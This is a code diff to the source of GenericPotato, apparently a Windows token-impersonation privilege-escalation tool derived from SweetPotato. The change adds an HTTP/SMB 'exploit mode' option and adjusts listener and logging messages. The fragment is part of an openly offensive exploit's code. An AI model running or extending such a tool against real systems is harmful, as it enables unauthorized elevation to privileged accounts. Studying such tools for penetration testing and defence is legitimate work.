@@ -19,10 +19,11 @@ namespace GenericPotato {
             string program = @"c:\Windows\System32\cmd.exe";
             string programArgs = null;
             ExecutionMethod executionMethod = ExecutionMethod.Auto;
+            PotatoAPI.Mode mode = PotatoAPI.Mode.SMB;
             bool showHelp = false;
 
             Console.WriteLine(
-                "Generic HTTP Potato by @micahvandeusen\n" +
+                "GenericPotato by @micahvandeusen\n" +
                  "  Modified from SweetPotato by @_EthicalChaos_\n"
                 );
 
@@ -30,7 +31,8 @@ namespace GenericPotato {
                 .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)
                 .Add("p=|prog=", "Program to launch (default cmd.exe)", v => program = v)
                 .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
-                .Add<ushort>("l=|port=", "Port to listen on (default 8888)", v => port = v)
+                .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode [HTTP|SMB(default)] ", v => mode = v)
+                .Add<ushort>("l=|port=", "HTTP Port to listen on (default 8888)", v => port = v)
                 .Add("h|help", "Display this help", v => showHelp = v != null);
 
             try {
@@ -67,10 +69,9 @@ namespace GenericPotato {
                     }
                 }
 
-                Console.WriteLine($"[+] Starting listener on port {port}");
-
-                PotatoAPI potatoAPI = new PotatoAPI(port);
+                PotatoAPI potatoAPI = new PotatoAPI(port, mode);
                 potatoAPI.readyEvent.WaitOne(); // Wait for listener to start
+                Console.WriteLine($"[+] Listener ready");
 
                 if (!potatoAPI.Trigger())
                 {
@@ -96,8 +97,6 @@ namespace GenericPotato {
                     PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                     si.cb = Marshal.SizeOf(si);
                     si.lpDesktop = @"WinSta0\Default";
-
-                    Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);
 
                     string finalArgs = null;
 
